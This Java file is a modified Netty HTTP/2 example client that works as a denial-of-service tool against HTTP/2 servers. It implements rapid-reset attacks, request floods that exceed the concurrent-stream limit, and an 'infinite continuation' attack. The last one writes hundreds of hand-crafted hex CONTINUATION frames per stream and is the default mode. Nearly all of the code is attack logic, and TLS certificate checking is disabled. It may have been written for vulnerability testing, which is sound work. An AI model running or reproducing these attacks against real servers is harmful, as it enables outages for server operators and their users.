/*
 * Copyright 2014 The Netty Project
 *
 * The Netty Project licenses this file to you under the Apache License, version 2.0 (the
 * "License"); you may not use this file except in compliance with the License. You may obtain a
 * copy of the License at:
 *
 * https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package io.netty.example.http2.helloworld.client;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultFullHttpRequest;
import io.netty.handler.codec.http.FullHttpRequest;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpHeaderValues;
import io.netty.handler.codec.http.HttpScheme;
import io.netty.handler.codec.http2.Http2SecurityUtil;
import io.netty.handler.codec.http2.HttpConversionUtil;
import io.netty.handler.ssl.ApplicationProtocolConfig;
import io.netty.handler.ssl.ApplicationProtocolConfig.Protocol;
import io.netty.handler.ssl.ApplicationProtocolConfig.SelectedListenerFailureBehavior;
import io.netty.handler.ssl.ApplicationProtocolConfig.SelectorFailureBehavior;
import io.netty.handler.ssl.ApplicationProtocolNames;
import io.netty.handler.ssl.OpenSsl;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.SslProvider;
import io.netty.handler.ssl.SupportedCipherSuiteFilter;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import io.netty.util.AsciiString;
import io.netty.util.CharsetUtil;

import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.TimeUnit;

import static io.netty.buffer.Unpooled.wrappedBuffer;
import static io.netty.handler.codec.http.HttpMethod.GET;
import static io.netty.handler.codec.http.HttpMethod.POST;
import static io.netty.handler.codec.http.HttpVersion.HTTP_1_1;

/**
 * An HTTP2 client that allows you to send HTTP2 frames to a server using HTTP1-style approaches
 * (via {@link io.netty.handler.codec.http2.InboundHttp2ToHttpAdapter}). Inbound and outbound
 * frames are logged.
 * When run from the command-line, sends a single HEADERS frame to the server and gets back
 * a "Hello World" response.
 * See the ./http2/helloworld/frame/client/ example for a HTTP2 client example which does not use
 * HTTP1-style objects and patterns.
 */
public final class Http2Client {

    static final boolean SSL = System.getProperty("ssl") != null;
    static final String HOST = System.getProperty("host", "127.0.0.1");
    static final int PORT = Integer.parseInt(System.getProperty("port", SSL? "8443" : "8030"));
    static final String URL = System.getProperty("url", "/H2TestModule/H2HeadersAndBody");
    static final int TRIES = Integer.parseUnsignedInt(System.getProperty("tries", "1"));
    static final boolean ENABLE_LOGGING = Boolean.getBoolean("enable_frame_logging");
    static final long STREAM_SPREAD_SLEEP = Long.parseUnsignedLong(System.getProperty("stream_spread_sleep", "20"));
    static final int THREAD_NUMBER = Integer.parseUnsignedInt(System.getProperty("thread_number", "100"));
    static final long BATCH_SPREAD_SLEEP = Long.parseUnsignedLong(System.getProperty("batch_spread_sleep", "5000"));
    // Different attack variations have been found
    // 1 Unending stream requests and resets
    // 2 Batch of stream requests/resets
    // 3 Unending stream of requests (exceeding maxConcurrentStreams)
    static final int ATTACK_VARIATION = Integer.parseUnsignedInt(System.getProperty("attack", "5"));

    public static void main(String[] args) throws Exception {
        // Configure SSL.
        final SslContext sslCtx = initializeSSL();
        // Create Netty objects for connections
        EventLoopGroup workerGroup = new NioEventLoopGroup();
        Http2ClientInitializer initializer = new Http2ClientInitializer(sslCtx, Integer.MAX_VALUE, URL, ENABLE_LOGGING);
        HttpResponseHandler responseHandler = initializer.responseHandler();
        // Create request specific config
        HttpScheme scheme = SSL ? HttpScheme.HTTPS : HttpScheme.HTTP;
        AsciiString hostName = new AsciiString(HOST + ':' + PORT);
        FullHttpRequest request = createSimpleGetRequest(URL, hostName, scheme);
        boolean invalidAttack = false;
        // Start test for bombarding streams and cancelling them
        System.err.println("Starting rapid reset requests...");
        try {
            for (int i = 0; i < TRIES; i++) {
                System.out.println("Starting connection number: " + (i+1));
                
                // Open connection to server
                Channel channel;
                try {
                    channel = openConnection(workerGroup, initializer);
                    System.out.println("Connected to [" + HOST + ':' + PORT + ']');
                } catch(Exception e){
                    System.out.println("Catched exception " + e + "while connecting to " +
                        "[" + HOST + ':' + PORT + ']');
                    continue;
                }

                // Create an executor service for managing threads
                ExecutorService executor = Executors.newFixedThreadPool(THREAD_NUMBER);

                // Wait for the HTTP/2 upgrade to occur.
                Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();
                try {
                    http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);
                } catch (Exception e) {
                    System.out.println("Catched exception/timeout waiting for preface " +
                        "from [" + HOST + ':' + PORT + ']');
                    continue;
                }

                switch(ATTACK_VARIATION){
                    case 1:
                        System.out.println();
                        System.out.println("***********************************************************");
                        System.out.println("*********  !!! RUNNING RAPID RESET VARIATION !!!  *********");
                        System.out.println("***********************************************************");
                        System.out.println();
                        runRapidResetVariation(initializer, http2SettingsHandler.ctx, request, executor);
                        break;
                    case 2:
                        System.out.println();
                        System.out.println("***********************************************************");
                        System.out.println("******  !!! RUNNING RAPID RESET BATCH VARIATION !!!  ******");
                        System.out.println("***********************************************************");
                        System.out.println();
                        runRapidResetBatchVariation(initializer, http2SettingsHandler.ctx, request, executor);
                        break;
                    case 3:
                        System.out.println();
                        System.out.println("***********************************************************");
                        System.out.println("********  !!! RUNNING RAPID REQUEST VARIATION !!!  ********");
                        System.out.println("***********************************************************");
                        System.out.println();
                        runRapidRequestNoResetVariation(initializer, http2SettingsHandler.ctx, request, executor);
                        break;
                    case 4:
                        System.out.println();
                        System.out.println("***********************************************************");
                        System.out.println("*****  !!! RUNNING RAPID REQUEST BATCH VARIATION !!!  *****");
                        System.out.println("***********************************************************");
                        System.out.println();
                        runRapidRequestNoResetBatchVariation(initializer, http2SettingsHandler.ctx, request, executor);
                        break;
                    case 5:
                        System.out.println();
                        System.out.println("***********************************************************");
                        System.out.println("*****  !!! RUNNING INFINITE CONTINUATION VARIATION !!!  *****");
                        System.out.println("***********************************************************");
                        System.out.println();
                        runInfiniteContinuationVariation(initializer, http2SettingsHandler.ctx, request, executor);
                        break;
                    default:
                        invalidAttack = true;
                        System.out.println();
                        System.out.println("***********************************************************");
                        System.out.println("***********  !!! INVALID ATTACK VARIATION: " + ATTACK_VARIATION +" !!!  *********");
                        System.out.println("***********************************************************");
                        System.out.println();
                        break;
                }

                if(invalidAttack)
                    break;

                System.out.println("Finished HTTP/2 request: " + channel);

                // Wait until the connection is closed. Possibly start another connection
                channel.close();
                executor.shutdownNow();
            }
        } finally {
            workerGroup.shutdownGracefully();
        }
    }

    public static SslContext initializeSSL() throws Exception {
        SslContext sslCtx;
        if (SSL) {
            SslProvider provider = OpenSsl.isAlpnSupported() ? SslProvider.OPENSSL : SslProvider.JDK;
            sslCtx = SslContextBuilder.forClient()
                .sslProvider(provider)
                /* NOTE: the cipher filter may not include all ciphers required by the HTTP/2 specification.
                * Please refer to the HTTP/2 specification for cipher requirements. */
                .ciphers(Http2SecurityUtil.CIPHERS, SupportedCipherSuiteFilter.INSTANCE)
                .trustManager(InsecureTrustManagerFactory.INSTANCE)
                .applicationProtocolConfig(new ApplicationProtocolConfig(
                    Protocol.ALPN,
                    // NO_ADVERTISE is currently the only mode supported by both OpenSsl and JDK providers.
                    SelectorFailureBehavior.NO_ADVERTISE,
                    // ACCEPT is currently the only mode supported by both OpenSsl and JDK providers.
                    SelectedListenerFailureBehavior.ACCEPT,
                    ApplicationProtocolNames.HTTP_2,
                    ApplicationProtocolNames.HTTP_1_1))
                .build();
        } else {
            sslCtx = null;
        }
        return sslCtx;
    }

    public static Channel openConnection(EventLoopGroup workerGroup, Http2ClientInitializer initializer) {
        // Configure the client.
        Bootstrap b = new Bootstrap();
        b.group(workerGroup);
        b.channel(NioSocketChannel.class);
        b.option(ChannelOption.SO_KEEPALIVE, true);
        b.remoteAddress(HOST, PORT);
        b.handler(initializer);

        // Start the client.
        return b.connect().syncUninterruptibly().channel();
    }

    public static FullHttpRequest createSimpleGetRequest(String url, AsciiString hostName, HttpScheme scheme) {
        FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, url, Unpooled.EMPTY_BUFFER);
        request.headers().add(HttpHeaderNames.HOST, hostName);
        request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());
        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);
        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);
        return request;
    }

    static String extraLongContinuationBlock = "0003ea090000X03e8426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f";

    public static void runInfiniteContinuationVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
        // Variation of sending infinite continuation headers
        // Start all the streams possibly allowed and reset them straight after requesting
        
        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
        Channel channel = ctx.channel();
        System.out.println("Going until streams: " + maxConcurrentStreams);
        // String size = "000046";
        String finalContinuationBlock = "000000090400X";
        String extraPathContinuationBlock = "000049090400X14472f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f";
        String dataBlock = "000006000100X414243313233";
        // String header1 = "000d637573746f6d4865616465723100155468697320697320637573746f6d48656164657231";
        // int continuationsToWrite = Integer.MAX_VALUE;
        maxConcurrentStreams = 7;
        for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
            int continuationsToWrite = 520;
            // Send headers for new stream
            if (!channel.isOpen()) {
                System.out.println("Channel: "+ channel + " was closed...");
                break;
            }
            initializer.connectionHandler().connection().local().createStream(streamId, false);
            System.out.println("Starting new stream: "+ streamId+ "...");
            ByteBuf header = Unpooled.wrappedBuffer(hexStringToByteArray("000022010000X8286141e2f4832546573744d6f64756c652f483248656164657273416e64426f6479".replaceFirst("X", String.format("%06x", streamId))));
            // No path
            ByteBuf header2 = Unpooled.wrappedBuffer(hexStringToByteArray("000002010000X8286".replaceFirst("X", String.format("%06x", streamId))));
            // Extra long path /test/test/test/test/test/test/test/test/test/test/test/test/test/test/
            ByteBuf header3 = Unpooled.wrappedBuffer(hexStringToByteArray("00004b010000X828614472f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f".replaceFirst("X", String.format("%06x", streamId))));
            if(streamId == 7) channel.writeAndFlush(header2);
            else if(streamId == 3) channel.writeAndFlush(header3);
            else channel.writeAndFlush(header);
            while (continuationsToWrite > 0) {
                // Send continuations
                ByteBuf continuation = Unpooled.wrappedBuffer(hexStringToByteArray(extraLongContinuationBlock.replaceFirst("X", String.format("%06x", streamId))));
                if (!channel.isOpen() || initializer.responseHandler().lastSeenStream >= streamId) {
                    System.out.println("Channel/Stream: "+ channel + " was closed...");
                    break;
                }
                if(streamId == 5)
                channel.writeAndFlush(continuation);
                Thread.sleep(STREAM_SPREAD_SLEEP);
                continuationsToWrite--;
            }
            // Send final block to close up headers
            if (continuationsToWrite <= 0) {
                // Send final continuation
                ByteBuf continuation = Unpooled.wrappedBuffer(hexStringToByteArray(finalContinuationBlock.replaceFirst("X", String.format("%06x", streamId))));
                if (!channel.isOpen() || initializer.responseHandler().lastSeenStream >= streamId) {
                    System.out.println("Channel/Stream: "+ channel + " was closed...");
                    break;
                }
                // if(streamId == 7)
                //     channel.writeAndFlush(Unpooled.wrappedBuffer(hexStringToByteArray(extraPathContinuationBlock.replaceFirst("X", String.format("%06x", streamId)))));
                // else
                    channel.writeAndFlush(continuation);
                Thread.sleep(STREAM_SPREAD_SLEEP);
                channel.writeAndFlush(Unpooled.wrappedBuffer(hexStringToByteArray(dataBlock.replaceFirst("X", String.format("%06x", streamId)))));
            }
        }
        Thread.sleep(3000);
    }

    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    public static void runRapidResetVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
        // Variation 1 rapid unending reset
        // Start all the streams possibly allowed and reset them straight after requesting
        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
        Channel channel = ctx.channel();
        System.out.println("Going until streams: " + maxConcurrentStreams);
        // To have concurrent streams running at the same time
        for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
            if (!channel.isOpen()) {
                System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
                break;
            }
            executor.submit(new RequestAndResetCallable(request, ctx,
                initializer, channel, streamId));
            Thread.sleep(STREAM_SPREAD_SLEEP);
        }
    }

    public static void runRapidResetBatchVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
        // Variation 2 rapid batch reset
        // Start a batch of rapid resets then rest and repeat next batch
        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
        int streamId = 3;
        boolean shouldStop = false;
        Channel channel = ctx.channel();
        System.out.println("Going until streams: " + maxConcurrentStreams + " with batches of: "+THREAD_NUMBER + " and pauses of: "+BATCH_SPREAD_SLEEP);
        for(int currentBatch = 1; streamId / 2 + 1 < maxConcurrentStreams || !shouldStop;  currentBatch ++){
            for (; streamId / 2 + 1 < currentBatch * THREAD_NUMBER; streamId += 2) {
                if (!channel.isOpen()) {
                    System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
                    shouldStop = true;
                    break;
                }
                executor.submit(new RequestAndResetCallable(request, ctx,
                    initializer, channel, streamId));
                Thread.sleep(STREAM_SPREAD_SLEEP);
            }
            System.out.println("Finished batch: " + currentBatch + " and resting: " + BATCH_SPREAD_SLEEP + " ms...");
            Thread.sleep(BATCH_SPREAD_SLEEP);
        }
    }

    public static void runRapidRequestNoResetVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, final FullHttpRequest request, ExecutorService executor) throws Exception{
        // Variation 3 rapid requests
        // Start a lot or requests to keep the pipeline full but don't reset them
        // Just keep the pipeline full and busy
        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
        final Channel channel = ctx.channel();
        System.out.println("Going until streams: " + maxConcurrentStreams);
        // To have concurrent streams running at the same time
        for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
            if (!channel.isOpen()) {
                System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
                break;
            }
            executor.submit(new Callable<Void>() {
                @Override
                public Void call() throws Exception {
                    if (!channel.isOpen()) {
                        System.out.println("Channel: " + channel + " was not open!");
                        return null;
                    }
                    channel.writeAndFlush(request);
                    return null;
                }
            });
            Thread.sleep(STREAM_SPREAD_SLEEP);
        }
    }

    public static void runRapidRequestNoResetBatchVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, final FullHttpRequest request, ExecutorService executor) throws Exception{
        // Variation 4 rapid batch requests
        // Start a lot or requests to keep the pipeline full but don't reset them
        // Just keep the pipeline full and busy
        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
        int streamId = 3;
        boolean shouldStop = false;
        final Channel channel = ctx.channel();
        System.out.println("Going until streams: " + maxConcurrentStreams + " with batches of: "+THREAD_NUMBER + " and pauses of: "+BATCH_SPREAD_SLEEP);
        for(int currentBatch = 1; streamId / 2 + 1 < maxConcurrentStreams || !shouldStop;  currentBatch ++){
            for (; streamId / 2 + 1 < currentBatch * THREAD_NUMBER; streamId += 2) {
                if (!channel.isOpen()) {
                    System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
                    shouldStop = true;
                    break;
                }
                executor.submit(new Callable<Void>() {
                    @Override
                    public Void call() throws Exception {
                        if (!channel.isOpen()) {
                            System.out.println("Channel: " + channel + " was not open!");
                            return null;
                        }
                        channel.writeAndFlush(request);
                        return null;
                    }
                });
                Thread.sleep(STREAM_SPREAD_SLEEP);
            }
            System.out.println("Finished batch: " + currentBatch + " and resting: " + BATCH_SPREAD_SLEEP + " ms...");
            Thread.sleep(BATCH_SPREAD_SLEEP);
        }
    }

    private static class RequestAndResetCallable implements Callable<Void> {

        FullHttpRequest request;
        ChannelHandlerContext ctx;
        Http2ClientInitializer initializer;
        Channel channel;
        int streamId;

        public RequestAndResetCallable(FullHttpRequest request, ChannelHandlerContext ctx,
                Http2ClientInitializer initializer, Channel channel, int streamId){
            super();
            this.request = request;
            this.ctx = ctx;
            this.initializer = initializer;
            this.channel = channel;
            this. streamId = streamId;
        }

        @Override
        public Void call() throws Exception {
            if (!channel.isOpen()) {
                System.out.println("Channel: " + channel + " was not open for stream: " + streamId);
                return null;
            }
            HttpResponseHandler responseHandler = initializer.responseHandler();
            ChannelFuture future = channel.writeAndFlush(request);
            // Await until write is finish to write the reset
            try {
                future.await(1000);
            } catch(Exception e) {
                System.out.println("Got exception waiting for flush on stream: " + streamId);
                return null;
            }
            if (!channel.isOpen()) {
                System.out.println("Channel: " + channel + " was not open after request sent for stream: " + streamId);
                return null;
            }
            initializer.connectionHandler().resetStream(ctx, streamId, 0, channel.newPromise());
            channel.flush();
            return null;
        }

    }

}
